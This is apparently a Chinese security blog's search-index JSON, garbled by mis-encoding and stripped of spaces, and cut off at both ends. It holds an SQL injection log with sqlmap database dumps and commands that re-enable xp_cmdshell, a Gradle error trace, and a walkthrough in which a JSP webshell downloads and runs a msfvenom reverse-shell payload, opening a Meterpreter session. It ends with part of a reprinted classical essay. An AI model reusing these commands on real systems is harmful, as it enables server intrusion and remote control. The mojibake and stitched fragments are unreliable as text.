HAR(78)+CHAR(111)+CHAR(108)+CHAR(112)+CHAR(72)+CHAR(81)+CHAR(82)+CHAR(108)+CHAR(89)+CHAR(68)+CHAR(67)+CHAR(99)+CHAR(105)+CHAR(109)+CHAR(105)+CHAR(86)+CHAR(121)+CHAR(99)+CHAR(122)+CHAR(90)+CHAR(109)+CHAR(112)+CHAR(98)+CHAR(88)+CHAR(89)+CHAR(68)+CHAR(90)+CHAR(101)+CHAR(71)+CHAR(100)+CHAR(118)+CHAR(81)+CHAR(114)+CHAR(83)+CHAR(101)+CHAR(90)+CHAR(117)+CHAR(100)+CHAR(113)+CHAR(113)+CHAR(118)+CHAR(120)+CHAR(113),NULL,NULL,NULL,NULL,NULL--HqcH---ä¿¡æ¯æœé›†åº·åº·userï¼Œå‘ç°æ˜¯dboã€‚SQLSERVERä¸­[dbo]çš„è§£é‡Šï¼šwebserveroperatingsystem:Windows2008R2or7webapplicationtechnology:ASP.NET4.0.30319,MicrosoftIIS7.5,ASP.NETback-endDBMS:MicrosoftSQLServer2008[11:16:02][INFO]callingMicrosoftSQLServershell.Toquittype'x'or'q'andpressENTERsql-shell&gt;user[11:16:13][INFO]fetchingSQLqueryoutput:'user'user:'dbo'çœ‹ä¸€ä¸‹æœåŠ¡å™¨æ˜¯å¦ç«™åº“åˆ†ç¦»ï¼šsql-shell&gt;select@@servername;[11:17:21][INFO]fetchingSQLSELECTstatementqueryoutput:'select@@servername'select@@servername;:'WIN-VO157IKGT24'sql-shell&gt;selecthost_name();[11:17:25][INFO]fetchingSQLSELECTstatementqueryoutput:'selecthost_name()'selecthost_name();:'WIN-VO157IKGT24'ä¸¤ä¸ªéƒ½æ˜¯WIN-VO157IKGT24æ‰€ä»¥åº”è¯¥æ²¡æœ‰ç«™åº“åˆ†ç¦»ã€‚çœ‹ä¸€ä¸‹æ•°æ®åº“ç‰ˆæœ¬å·sql-shell&gt;Select@@version[11:17:34][INFO]fetchingSQLSELECTstatementqueryoutput:'Select@@version'Select@@version:'MicrosoftSQLServer2008R2(RTM)-10.50.1600.1(X64)\\n\\tApr2201015:48:46\\n\\tCopyright(c)MicrosoftCorporation\\n\\tStandardEdition(64-bit)onWindowsNT6.1&lt;X64&gt;(Build7601:ServicePack1)\\n'root@#:/home/tool/sqlmap-data/wsdl-inject#sqlmap-rnet-test1.txt--batch--dbs---[11:04:34][INFO]theback-endDBMSisMicrosoftSQLServerwebserveroperatingsystem:Windows2008R2or7webapplicationtechnology:ASP.NET4.0.30319,MicrosoftIIS7.5,ASP.NETback-endDBMS:MicrosoftSQLServer2008[11:04:34][INFO]fetchingdatabasenamesavailabledatabases[7]:[*]master[*]model[*]msdb[*]ReportServer[*]ReportServerTempDB[*]tempdb[*]ytems[11:04:35][INFO]fetcheddataloggedtotextfilesunder'/root/.sqlmap/output/underattack-host'[*]shuttingdownat11:04:35ææƒdbccaddextendedproc(\"sp_oacreate\",\"odsole70.dll\");dbccaddextendedproc(\"xp_cmdshell\",\"xplog70.dll\");tobecontinuedï¼›"
  },

  {
    "title"    : "ã€Œå®‰å“ã€:ä½¿ç”¨rootCloakç»•è¿‡rootæƒé™ç›‘æµ‹",
    "category" : "",
    "tags"     : "ç¬”è®°, Android Reverse",
    "url"      : "/blog/2020/escape/from_android_root/",
    "date"     : "May 15, 2020",
    "content"  : "gradleæ‰“åŒ…https://blog.csdn.net/EthanCo/article/details/52064044https://www.kutu66.com/GitHub/article_105897https://jingyan.baidu.com/article/c45ad29c20a123051753e2af.html.\\gradlew.battaskActivecodepage:65001FailedtonotifyProjectEvaluationListener.afterEvaluate(),butprimaryconfigurationfailuretakesprecedence.java.lang.RuntimeException:SDKlocationnotfound.Definelocationwithsdk.dirinthelocal.propertiesfileorwithanANDROID_HOMEenvironmentvariable.atorg.gradle.initialization.DefaultGradleLauncher.doBuildStages(DefaultGradleLauncher.java:122)atorg.gradle.initialization.DefaultGradleLauncher.access$200(DefaultGradleLauncher.java:32)atorg.gradle.initialization.DefaultGradleLauncher$1.create(DefaultGradleLauncher.java:99)atorg.gradle.initialization.DefaultGradleLauncher$1.create(DefaultGradleLauncher.java:93)atorg.gradle.internal.progress.DefaultBuildOperationExecutor.run(DefaultBuildOperationExecutor.java:90)atorg.gradle.internal.progress.DefaultBuildOperationExecutor.run(DefaultBuildOperationExecutor.java:62)atorg.gradle.initialization.DefaultGradleLauncher.doBuild(DefaultGradleLauncher.java:93)atorg.gradle.initialization.DefaultGradleLauncher.run(DefaultGradleLauncher.java:82)atorg.gradle.launcher.exec.InProcessBuildActionExecuter$DefaultBuildController.run(InProcessBuildActionExecuter.java:94)atorg.gradle.tooling.internal.provider.ExecuteBuildActionRunner.run(ExecuteBuildActionRunner.java:28)atorg.gradle.launcher.exec.ChainingBuildActionRunner.run(ChainingBuildActionRunner.java:35)atorg.gradle.launcher.exec.InProcessBuildActionExecuter.execute(InProcessBuildActionExecuter.java:43)atorg.gradle.launcher.exec.InProcessBuildActionExecuter.execute(InProcessBuildActionExecuter.java:28)atorg.gradle.launcher.exec.ContinuousBuildActionExecuter.execute(ContinuousBuildActionExecuter.java:78)atorg.gradle.launcher.exec.ContinuousBuildActionExecuter.execute(ContinuousBuildActionExecuter.java:48)atorg.gradle.launcher.exec.DaemonUsageSuggestingBuildActionExecuter.execute(DaemonUsageSuggestingBuildActionExecuter.java:51)atorg.gradle.launcher.exec.DaemonUsageSuggestingBuildActionExecuter.execute(DaemonUsageSuggestingBuildActionExecuter.java:28)atorg.gradle.launcher.cli.RunBuildAction.run(RunBuildAction.java:43)atorg.gradle.internal.Actions$RunnableActionAdapter.execute(Actions.java:170)atorg.gradle.launcher.cli.CommandLineActionFactory$ParseAndBuildAction.execute(CommandLineActionFactory.java:237)atorg.gradle.launcher.cli.CommandLineActionFactory$ParseAndBuildAction.execute(CommandLineActionFactory.java:210)atorg.gradle.launcher.cli.JavaRuntimeValidationAction.execute(JavaRuntimeValidationAction.java:35)atorg.gradle.launcher.cli.JavaRuntimeValidationAction.execute(JavaRuntimeValidationAction.java:24)atorg.gradle.launcher.cli.CommandLineActionFactory$WithLogging.execute(CommandLineActionFactory.java:206)atorg.gradle.launcher.cli.CommandLineActionFactory$WithLogging.execute(CommandLineActionFactory.java:169)atorg.gradle.launcher.cli.ExceptionReportingAction.execute(ExceptionReportingAction.java:33)atorg.gradle.launcher.cli.ExceptionReportingAction.execute(ExceptionReportingAction.java:22)atorg.gradle.launcher.Main.doAction(Main.java:33)atorg.gradle.launcher.bootstrap.EntryPoint.run(EntryPoint.java:45)atsun.reflect.NativeMethodAccessorImpl.invoke0(NativeMethod)atsun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)atsun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)atjava.lang.reflect.Method.invoke(Method.java:498)atorg.gradle.launcher.bootstrap.ProcessBootstrap.runNoExit(ProcessBootstrap.java:54)atorg.gradle.launcher.bootstrap.ProcessBootstrap.run(ProcessBootstrap.java:35)atorg.gradle.launcher.GradleMain.main(GradleMain.java:23)atsun.reflect.NativeMethodAccessorImpl.invoke0(NativeMethod)atsun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)atsun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)atjava.lang.reflect.Method.invoke(Method.java:498)atorg.gradle.wrapper.BootstrapMainStarter.start(BootstrapMainStarter.java:33)atorg.gradle.wrapper.WrapperExecutor.execute(WrapperExecutor.java:130)atorg.gradle.wrapper.GradleWrapperMain.main(GradleWrapperMain.java:48)FAILURE:Buildfailedwithanexception.https://blog.csdn.net/coder_ken/article/details/50853927"
  },

  {
    "title"    : "ã€Œæ¸—é€ã€:ä¸€å¥è¯åå¼¹docker-shell",
    "category" : "",
    "tags"     : "docker, Web, æ¸—é€",
    "url"      : "/blog/2020/docker/reverse/shell/by1/",
    "date"     : "Apr 27, 2020",
    "content"  : "ä¸€å¥è¯æœ¨é©¬åå¼¹shellå‰æï¼šç°åœ¨æƒ…å†µæ˜¯å·²ç»ä¸Šä¼ äº†ä¸€å¥è¯æœ¨é©¬ï¼Œå¯ä»¥æ‰§è¡Œå‘½ä»¤å¦‚ï¼šls,pwd,whoamiç­‰ï¼›é—®é¢˜åœ¨äºï¼Œä¸ç®¡ç”¨pythonã€bashè¿˜æ˜¯perléƒ½åå¼¹ä¸äº†ï¼ˆå¦‚ä¸‹ï¼‰ï¼Œå·ä¸äº†æ‡’ï¼Œå°±ä¸ŠmsfæŠŠã€‚http://target-ip/where/muma/path/are/1587808279743_shell.jsp?pwd=admin&amp;cmd=pwd/u01/oracle/user_projects/domains/base_domainhttp://target-ip/where/muma/path/are/1587808279743_shell.jsp?pwd=admin&amp;cmd=whoamioraclemsfç”Ÿæˆshellæ–‡ä»¶msfvenomå…ˆç”Ÿæˆåå¼¹shellæ–‡ä»¶ï¼Œèµ‹æƒã€‚root@iZj6cgn7odv59wmjjhe6zwZ:~##msfvenom-plinux/x64/meterpreter_reverse_tcpLHOST=47.52.233.92LPORT=1234-felf&gt;shell.elf[-]Noplatformwasselected,choosingMsf::Module::Platform::Linuxfromthepayload[-]Noarchselected,selectingarch:x64fromthepayloadNoencoderorbadcharsspecified,outputtingrawpayloadPayloadsize:1046632bytesFinalsizeofelffile:1046632bytesroot@iZj6cgn7odv59wmjjhe6zwZ:~##chmod777shell.elf#http://target-ip/where/muma/path/are/1587808279743_shell.jsp?pwd=admin&amp;cmd=ls#æµ‹è¯•ä¸€ä¸‹ä¸€å¥è¯æœ¨é©¬ï¼Œæ˜¯å¯ä»¥æ‰§è¡Œå‘½ä»¤çš„ï¼štotal1100drwxr-x---15oracleoracle4096Apr2708:06.drwxr-x---3oracleoracle4096Apr2500:23..drwxr-x---2oracleoracle4096Apr2500:23autodeploydrwxr-x---6oracleoracle4096Apr2500:23bindrwxr-x---3oracleoracle4096Apr2500:23commondrwxr-x---9oracleoracle4096Apr2500:24configdrwxr-x---2oracleoracle4096Apr2500:23console-ext-rw-r-----1oracleoracle234Apr2500:23derby.log-rw-r-----1oracleoracle257Apr2500:24edit.lok-rw-r-----1oracleoracle327Jul192017fileRealm.propertiesdrwxr-x---3oracleoracle4096Apr2500:23init-infodrwxr-x---2oracleoracle4096Apr2500:23libdrwxr-x---2oracleoracle4096Apr2500:23nodemanagerdrwxr-x---3oracleoracle4096Apr2500:23orchestrationdrwxr-x---2oracleoracle4096Apr2601:39originaldrwxr-x---2oracleoracle4096Apr2500:23securitydrwxr-x---3oracleoracle4096Apr2500:23servers-rwxr-x---1oracleoracle261Apr2500:23startWebLogic.shdrwxr-x---3oracleoracle4096Apr2509:49tmpä¸‹è½½shellæ–‡ä»¶æ‰§è¡Œåœ¨ä¸€å¥è¯æœ¨é©¬ä¸Šæ‰§è¡Œä¸‹è½½å‘½ä»¤ï¼ŒWgetå’ŒCurléƒ½å¯ä»¥ï¼Œä¸€èˆ¬linuxæœºå™¨ä¸Šéƒ½è‡ªå¸¦ä¸‹è½½å·¥å…·#http://target-ip/where/muma/path/are/1587808279743_shell.jsp?pwd=admin&amp;cmd=curl-oshell.elfhttp://ip/shell.elf#ç­‰å¾…ä¸‹è½½å®Œæ¯•ï¼›ç»§ç»­èµ‹æƒchmod777shell.elf#åœ¨æŸ¥çœ‹ä¸€ä¸‹ï¼štotal1100drwxr-x---15oracleoracle4096Apr2708:06.drwxr-x---3oracleoracle4096Apr2500:23..drwxr-x---2oracleoracle4096Apr2500:23autodeploydrwxr-x---6oracleoracle4096Apr2500:23bindrwxr-x---3oracleoracle4096Apr2500:23commondrwxr-x---9oracleoracle4096Apr2500:24configdrwxr-x---2oracleoracle4096Apr2500:23console-ext-rw-r-----1oracleoracle234Apr2500:23derby.log-rw-r-----1oracleoracle257Apr2500:24edit.lok-rw-r-----1oracleoracle327Jul192017fileRealm.propertiesdrwxr-x---3oracleoracle4096Apr2500:23init-infodrwxr-x---2oracleoracle4096Apr2500:23libdrwxr-x---2oracleoracle4096Apr2500:23nodemanagerdrwxr-x---3oracleoracle4096Apr2500:23orchestrationdrwxr-x---2oracleoracle4096Apr2601:39originaldrwxr-x---2oracleoracle4096Apr2500:23securitydrwxr-x---3oracleoracle4096Apr2500:23servers-rwxrwxrwx1oracleoracle1046632Apr2708:06shell.elf-rwxr-x---1oracleoracle261Apr2500:23startWebLogic.shdrwxr-x---3oracleoracle4096Apr2509:49tmpshellæµé‡æ¥å…¥æˆ‘ä»¬å‘ç°å·²ç»æˆåŠŸä¸‹è½½äº†åå¼¹shellçš„msfæ–‡ä»¶ï¼Œç›´æ¥æ‰§è¡Œhttp://target-ip/where/muma/path/are/1587808279743_shell.jsp?pwd=admin&amp;cmd=./shell.elfï¼Œæ‰§è¡Œå‰åˆ«å¿˜äº†åœ¨æœåŠ¡å™¨ä¸Šç›‘å¬ç«¯å£ã€‚#msfconsolemsf5&gt;useexploit/multi/handlermsf5exploit(multi/handler)&gt;setPAYLOADlinux/x64/meterpreter_reverse_tcpPAYLOAD=&gt;linux/x64/meterpreter_reverse_tcpmsf5exploit(multi/handler)&gt;setLHOST0.0.0.0LHOST=&gt;0.0.0.0msf5exploit(multi/handler)&gt;setLPORT1234LPORT=&gt;1234msf5exploit(multi/handler)&gt;run[*]StartedreverseTCPhandleron0.0.0.0:1234æ‰§è¡Œå®Œå°±å¯ä»¥çœ‹åˆ°å»ºç«‹è¿æ¥çš„æµé‡æ¥å…¥äº†ï¼š[*]Meterpretersession1opened(172.31.116.237:1234-&gt;59.110.152.168:44832)at2020-04-2716:08:48+0800#ä¸‹ä¸€æ­¥ï¼šmeterpreter&gt;shellProcess460created.Channel1created.whoamioracle#è·å¾—ä¸€ä¸ªäº¤äº’å¼shellpython-c'importpty;pty.spawn(\"/bin/sh\")'sh-4.2$whoamiwhoamioraclesh-4.2$sudosusudosush:sudo:commandnotfoundpython-c'importpty;pty.spawn(\"/bin/bash\")'[oracle@5c6fe690ac22base_domain]$pwdpwd/u01/oracle/user_projects/domains/base_domain[oracle@5c6fe690ac22base_domain]$lslsautodeployconsole-extinit-infooriginalstartWebLogic.shbinderby.loglibsecuritytmpcommonedit.loknodemanagerserversconfigfileRealm.propertiesorchestrationshell.elf[oracle@5c6fe690ac22base_domain]$uname-auname-aLinux5c6fe690ac223.10.0-1062.12.1.el7.x86_64##1SMPTueFeb423:02:59UTC2020x86_64x86_64x86_64GNU/Linuxä»¥ä¸Šã€‚"
  },

  {
    "title"    : "ã€Šåšé»‘å­¦ã€‹:è½¬è½½",
    "category" : "",
    "tags"     : "ç¬”è®°, è¯—æ–‡, ç»å…¸",
    "url"      : "/top/2020/hou-hei-xue-post/",
    "date"     : "Apr 10, 2020",
    "content"  : "ã€Šåšé»‘å­¦ã€‹Â·æå®—å¾Â·(1879-1944)ã€€ã€€æˆ‘è‡ªè¯»ä¹¦è¯†å­—ä»¥æ¥ï¼Œå°±æƒ³ä¸ºè‹±é›„è±ªæ°ï¼Œæ±‚ä¹‹å››ä¹¦äº”ç»ï¼ŒèŒ«æ— æ‰€å¾—ï¼Œæ±‚ä¹‹è¯¸å­ç™¾å®¶ï¼Œä¸å¤«å»¿å››å²ï¼Œä»æ— æ‰€å¾—ï¼Œä»¥ä¸ºå¤ä¹‹ä¸ºè‹±é›„è±ªæ°è€…ï¼Œå¿…æœ‰ä¸ä¼ ä¹‹ç§˜ï¼Œä¸è¿‡å¾äººç”Ÿæ€§æ„šé²ï¼Œå¯»ä»–ä¸å‡ºç½¢äº†ã€‚ç©·ç´¢å†¥æœï¼Œå¿˜å¯åºŸé£Ÿï¼Œå¦‚æ˜¯è€…æœ‰å¹´ï¼Œä¸€æ—¦å¶ç„¶æƒ³èµ·ä¸‰å›½æ—¶å‡ ä¸ªäººç‰©ï¼Œä¸è§‰æç„¶å¤§æ‚Ÿæ›°ï¼šå¾—ä¹‹çŸ£ï¼Œå¾—ä¹‹çŸ£ï¼Œå¤ä¹‹ä¸ºè‹±é›„è±ªæ°è€…ï¼Œä¸è¿‡é¢åšå¿ƒé»‘è€Œå·²ã€‚ã€€ã€€ä¸‰å›½è‹±é›„ï¼Œé¦–æ¨æ›¹æ“ï¼Œä»–çš„ç‰¹é•¿ï¼Œå…¨åœ¨å¿ƒé»‘ï¼šä»–æ€å•ä¼¯å¥¢ï¼Œæ€å­”èï¼Œæ€æ¨ä¿®ï¼Œæ€è‘£æ‰¿ä¼å®Œï¼Œåˆæ€çš‡åçš‡å­ï¼Œæ‚ç„¶ä¸é¡¾ï¼Œå¹¶ä¸”æ˜ç›®å¼ èƒ†åœ°è¯´ï¼šâ€œå®æˆ‘è´Ÿäººï¼Œæ¯‹äººè´Ÿæˆ‘ã€‚â€å¿ƒå­ä¹‹é»‘ï¼ŒçœŸæ˜¯è¾¾äºæç‚¹äº†ã€‚æœ‰äº†è¿™æ ·æœ¬äº‹ï¼Œå½“ç„¶ç§°ä¸ºä¸€ä¸–ä¹‹é›„äº†ã€‚ã€€ã€€å…¶æ¬¡è¦ç®—åˆ˜å¤‡ï¼Œä»–çš„ç‰¹é•¿ï¼Œå…¨åœ¨äºè„¸çš®åšï¼šä»–ä¾æ›¹æ“ï¼Œä¾å•å¸ƒï¼Œä¾åˆ˜è¡¨ï¼Œä¾å­™æƒï¼Œä¾è¢ç»ï¼Œä¸œçªœè¥¿èµ°ï¼Œå¯„äººç¯±ä¸‹ï¼Œæ¬ä¸ä¸ºè€»ï¼Œè€Œä¸”ç”Ÿå¹³å–„å“­ï¼Œåšä¸‰å›½æ¼”ä¹‰çš„äººï¼Œæ›´æŠŠä»–å†™å¾—ç»´å¦™ç»´è‚–ï¼Œé‡åˆ°ä¸èƒ½è§£å†³çš„äº‹æƒ…ï¼Œå¯¹äººç—›å“­ä¸€åœºï¼Œç«‹å³è½¬è´¥ä¸ºåŠŸï¼Œæ‰€ä»¥ä¿—è¯­æœ‰äº‘ï¼šâ€œåˆ˜å¤‡çš„æ±Ÿå±±ï¼Œæ˜¯å“­å‡ºæ¥çš„ã€‚â€è¿™ä¹Ÿæ˜¯ä¸€ä¸ªæœ‰æœ¬äº‹çš„è‹±é›„ã€‚ä»–å’Œæ›¹æ“ï¼Œå¯ç§°åŒç»ï¼›å½“è‘—ä»–ä»¬ç…®é…’è®ºè‹±é›„çš„æ—¶å€™ï¼Œä¸€ä¸ªå¿ƒå­æœ€é»‘ï¼Œä¸€ä¸ªè„¸çš®æœ€åšï¼Œä¸€å ‚æ™¤å¯¹ï¼Œä½ æ— å¥ˆæˆ‘ä½•ï¼Œæˆ‘æ— å¥ˆä½ ä½•ï¼Œç¯é¡¾è¢æœ¬åˆè¯¸äººï¼Œå‘é„™ä¸è¶³é“ï¼Œæ‰€ä»¥æ›¹æ“è¯´ï¼šâ€œå¤©ä¸‹è‹±é›„ï¼ŒæƒŸä½¿å›ä¸æ“è€³ã€‚â€ç…®é…’è®ºè‹±é›„ï¼Œå¤©ä¸‹è‹±é›„ï¼ŒæƒŸä½¿å›ä¸æ“è€³ï¼Œå•†ä¸šäº’å¹è€³ã€‚^_^ã€€ã€€æ­¤å¤–è¿˜æœ‰ä¸€ä¸ªå­™æƒï¼Œä»–å’Œåˆ˜å¤‡åŒç›Ÿï¼Œå¹¶ä¸”æ˜¯éƒèˆ…ä¹‹äº²ï¼Œå¿½ç„¶å¤ºå–è†å·ï¼ŒæŠŠå…³ç¾½æ€äº†ï¼Œå¿ƒä¹‹é»‘ï¼Œä»¿ä½›æ›¹æ“ï¼Œæ— å¥ˆé»‘ä¸åˆ°åº•ï¼Œè·Ÿè‘—å‘èœ€è¯·å’Œï¼Œå…¶é»‘çš„ç¨‹åº¦ï¼Œå°±è¦æ¯”æ›¹æ“ç¨é€Šä¸€ç‚¹ã€‚ä»–ä¸æ›¹æ“æ¯”è‚©ç§°é›„ï¼ŒæŠ—ä¸ç›¸ä¸‹ï¼Œå¿½ç„¶åœ¨æ›¹ä¸é©¾ä¸‹ç§°è‡£ï¼Œè„¸çš®ä¹‹åšï¼Œä»¿ä½›åˆ˜å¤‡ï¼Œæ— å¥ˆåšä¸åˆ°åº•ï¼Œè·Ÿè‘—ä¸é­ç»äº¤ï¼Œå…¶åšçš„ç¨‹åº¦ä¹Ÿæ¯”åˆ˜å¤‡ç¨é€Šä¸€ç‚¹ã€‚ä»–è™½æ˜¯é»‘ä¸å¦‚æ“ï¼Œåšä¸å¦‚å¤‡ï¼Œå´æ˜¯äºŒè€…å…¼å¤‡ï¼Œä¹Ÿä¸èƒ½ä¸ç®—æ˜¯ä¸€ä¸ªè‹±é›„ã€‚ä»–ä»¬ä¸‰ä¸ªäººï¼ŒæŠŠå„äººçš„æœ¬äº‹æ–½å±•å¼€æ¥ï¼Œä½ ä¸èƒ½å¾æœæˆ‘ï¼Œæˆ‘ä¸èƒ½æœä½ ï¼Œé‚£æ—¶å€™çš„å¤©ä¸‹ï¼Œå°±ä¸èƒ½ä¸åˆ†è€Œä¸ºä¸‰ã€‚ã€€ã€€åæ¥æ›¹æ“ã€åˆ˜å¤‡ã€å­™æƒï¼Œç›¸ç»§æ­»äº†ï¼Œå¸é©¬æ°çˆ¶å­ä¹˜æ—¶å´›èµ·ï¼Œä»–ç®—æ˜¯å—äº†æ›¹åˆ˜è¯¸äººçš„è–°é™¶ï¼Œé›†åšé»‘å­¦ä¹‹å¤§æˆï¼Œä»–èƒ½æ¬ºäººå¯¡å¦‡å­¤å„¿ï¼Œå¿ƒä¹‹é»‘ä¸æ›¹æ“ä¸€æ ·ï¼›èƒ½å¤Ÿå—å·¾å¸¼ä¹‹è¾±ï¼Œè„¸çš®ä¹‹åšï¼Œè¿˜æ›´ç”šäºåˆ˜å¤‡ï¼›æˆ‘è¯»å²è§å¸é©¬æ‡¿å—è¾±å·¾å¸¼è¿™æ®µäº‹ï¼Œä¸ç¦æ‹æ¡ˆå¤§å«ï¼šâ€œå¤©ä¸‹å½’å¸é©¬æ°çŸ£ï¼â€æ‰€ä»¥å¾—åˆ°äº†è¿™ä¸ªæ—¶å€™ï¼Œå¤©ä¸‹å°±ä¸å¾—ä¸ç»Ÿä¸€ï¼Œè¿™éƒ½æ˜¯â€œäº‹æœ‰å¿…è‡³ï¼Œç†æœ‰å›ºç„¶â€ã€‚ã€€ã€€è¯¸è‘›æ­¦å€™ï¼Œå¤©ä¸‹å¥‡æ‰ï¼Œæ˜¯ä¸‰ä»£ä¸‹ç¬¬ä¸€äººï¼Œé‡è‘—å¸é©¬æ‡¿è¿˜æ˜¯æ²¡æœ‰åŠæ³•ï¼Œä»–ä¸‹äº†â€é èº¬å°½ç˜ï¼Œæ­»è€Œåå·²â€çš„å†³å¿ƒï¼Œç»ˆä¸èƒ½å–å¾—ä¸­åŸå°ºå¯¸ä¹‹åœ°ï¼Œç«Ÿè‡³å‘•è¡€è€Œæ­»ï¼Œå¯è§ç‹ä½ä¹‹æ‰ï¼Œä¹Ÿä¸æ˜¯åšé»‘åå®¶çš„æ•Œæ‰‹ã€‚ã€€ã€€æˆ‘æŠŠä»–å‡ ä¸ªäººç‰©çš„äº‹ï¼Œåå¤ç ”ç©¶ï¼Œå°±æŠŠè¿™åƒå¤ä¸ä¼ çš„ç§˜è¯€ï¼Œå‘ç°å‡ºæ¥ã€‚ä¸€éƒ¨äºŒåå››å²ï¼Œå¯ä¸€ä»¥è´¯ä¹‹ï¼šâ€œåšé»‘è€Œå·±ã€‚â€å…¹å†ä¸¾æ±‰çš„äº‹æ¥è¯æ˜ä¸€ä¸‹ã€‚ã€€ã€€é¡¹ç¾½æ‹”å±±ç›–ä¸–ä¹‹é›„ã€‚å’½é¸£å±å’ï¼Œåƒäººçš†åºŸï¼Œä¸ºä»€ä¹ˆèº«æ­»ä¸œåŸï¼Œä¸ºå¤©ä¸‹ç¬‘ï¼ä»–å¤±è´¥çš„åŸå› ï¼ŒéŸ©ä¿¡æ‰€è¯´ï¼šâ€œå¦‡äººä¹‹ä»ï¼ŒåŒ¹å¤«ä¹‹å‹‡â€ä¸¤å¥è¯ï¼ŒåŒ…æ‹¬å°½äº†ã€‚å¦‡äººä¹‹ä»ï¼Œæ˜¯å¿ƒæœ‰æ‰€ä¸å¿ï¼Œå…¶ç—…æ ¹åœ¨å¿ƒå­ä¸é»‘ï¼›åŒ¹å¤«ä¹‹å‹‡ï¼Œæ˜¯å—ä¸å¾—æ°”ï¼Œå…¶ç—…æ ¹åœ¨è„¸çš®ä¸åšã€‚é¸¿é—¨ä¹‹å®´ï¼Œé¡¹ç¾½å’Œåˆ˜é‚¦ï¼ŒåŒåä¸€å¸­ï¼Œé¡¹åº„å·²ç»æŠŠå‰‘å–å‡ºæ¥äº†ï¼Œåªè¦åœ¨åˆ˜é‚¦çš„é¢ˆä¸Šä¸€åˆ’ï¼Œâ€œå¤ªé«˜çš‡å¸â€çš„æ‹›ç‰Œï¼Œç«‹åˆ»å¯ä»¥æŒ‚å‡ºï¼Œä»–ååå¾˜å¾Šä¸å¿ï¼Œç«Ÿè¢«åˆ˜é‚¦é€ƒèµ°ã€‚å“ä¸‹ä¹‹è´¥ï¼Œå¦‚æœæ¸¡è¿‡ä¹Œæ±Ÿï¼Œå·åœŸé‡æ¥ï¼Œå°šä¸çŸ¥é¹¿æ­»è°æ‰‹ï¼Ÿä»–åååˆè¯´ï¼šâ€œç±ä¸æ±Ÿä¸œå­å¼Ÿå…«åƒäººï¼Œæ¸¡æ±Ÿè€Œè¥¿ï¼Œä»Šæ— ä¸€äººè¿˜ï¼Œçºµæ±Ÿä¸œçˆ¶å…„ï¼Œæ€œæˆ‘å¿µæˆ‘ï¼Œæˆ‘ä½•é¢ç›®è§ä¹‹ã€‚çºµå½¼ä¸è¨€ï¼Œç±ç‹¬ä¸æ„§äºå¿ƒä¹ï¼Ÿâ€è¿™äº›è¯ï¼ŒçœŸæ˜¯å¤§é”™ç‰¹é”™ï¼ä»–ä¸€åˆ™æ›°ï¼šâ€œæ— é¢è§äººâ€ï¼›å†åˆ™æ›°ï¼šâ€œæœ‰æ„§äºå¿ƒã€‚â€ç©¶ç«Ÿé«˜äººçš„é¢ï¼Œæ˜¯å¦‚ä½•é•¿èµ·å¾—ï¼Œé«˜äººçš„å¿ƒï¼Œæ˜¯å¦‚ä½•ç”Ÿèµ·å¾—ï¼Ÿä¹Ÿä¸ç•¥åŠ è€ƒå¯Ÿï¼Œåè¯´ï¼šâ€œæ­¤å¤©äº¡æˆ‘ï¼Œéæˆ˜ä¹‹ç½ªâ€ï¼Œææ€•ä¸Šå¤©ä¸èƒ½ä»»å’å§ã€‚ã€€ã€€æˆ‘ä»¬åˆæ‹¿åˆ˜é‚¦çš„æœ¬äº‹ç ”ç©¶ä¸€ä¸‹ï¼Œå²è®°è½½ï¼šé¡¹ç¾½é—®æ±‰ç‹æ›°ï¼šâ€œå¤©ä¸‹åŒˆåŒˆæ•°å²ï¼Œå¾’å¾ä¸¤äººè€³ï¼Œæ„¿ä¸æ±‰ç‹æŒ‘æˆ˜å†³é›Œé›„ã€‚â€æ±‰ç‹ç¬‘è°¢æ›°ï¼šâ€œå¾å®æ–—æ™ºä¸æ–—åŠ›ã€‚â€è¯·é—®ç¬‘è°¢äºŒå­—ä»ä½•ç”Ÿå‡ºï¼Ÿåˆ˜é‚¦è§éƒ¦ç”Ÿæ—¶ï¼Œä½¿ä¸¤å¥³å­æ´—è„šï¼Œéƒ¦ç”Ÿè´£ä»–å€¨è§é•¿è€…ï¼Œä»–ç«‹åˆ»è¾ä¸ºä¹‹è°¢ã€‚è¿˜æœ‰è‡ªå·±çš„çˆ¶äº²ï¼Œèº«åœ¨ä¿ä¸‹ï¼Œä»–è¦åˆ†ä¸€æ¯ç¾¹ï¼›äº²ç”Ÿå„¿å¥³ï¼Œå­æƒ é²å…ƒï¼Œæ¥šå…µè¿½è‡³ï¼Œä»–èƒ½å¤Ÿæ¨ä»–ä¸‹è½¦ï¼›åæ¥åˆæ€éŸ©ä¿¡ï¼Œæ€å½­è¶Šï¼Œâ€œé¸Ÿå°½å¼“è—ï¼›å…”æ­»ç‹—çƒ¹â€ï¼Œè¯·é—®åˆ˜é‚¦çš„å¿ƒå­ï¼Œæ˜¯ä½•çŠ¶æ€ï¼Œå²‚æ˜¯é‚£â€œå¦‡äººä¹‹ä»ï¼ŒåŒ¹å¤«ä¹‹å‹‡â€çš„é¡¹ç¾½ï¼Œæ‰€èƒ½æ¢¦è§ï¼Ÿå¤ªå²å…¬è‘—æœ¬çºªï¼Œåªè¯´åˆ˜é‚¦éš†å‡†é¾™é¢œï¼Œé¡¹ç¾½æ˜¯é‡ç³å­ï¼Œç‹¬äºäºŒäººçš„é¢çš®åšè–„ï¼Œå¿ƒä¹‹é»‘ç™½ï¼Œæ²¡æœ‰ä¸€å­—æåŠï¼Œæœªå…æœ‰æ„§è‰¯å²ã€‚ã€€ã€€åˆ˜é‚¦çš„é¢ï¼Œåˆ˜é‚¦çš„å¿ƒï¼Œæ¯”è¾ƒåˆ«äººç‰¹åˆ«ä¸åŒï¼Œå¯ç§°å¤©çºµä¹‹åœ£ã€‚é»‘ä¹‹ä¸€å­—ï¼ŒçœŸæ˜¯â€ç”Ÿå’Œå®‰è¡Œï¼Œä»å¿ƒæ‰€æ¬²ä¸é€¾çŸ©â€ï¼Œè‡³äºåšå­—æ–¹é¢ï¼Œè¿˜åŠ äº†ç‚¹å­¦å†ï¼Œä»–çš„ä¸šå¸ˆï¼Œå°±æ˜¯ä¸‰æ°ä¸­çš„å¼ è‰¯ï¼Œå¼ è‰¯çš„ä¸šå¸ˆï¼Œæ˜¯åœ®ä¸Šè€äººï¼Œä»–ä»¬çš„è¡£é’µçœŸä¼ 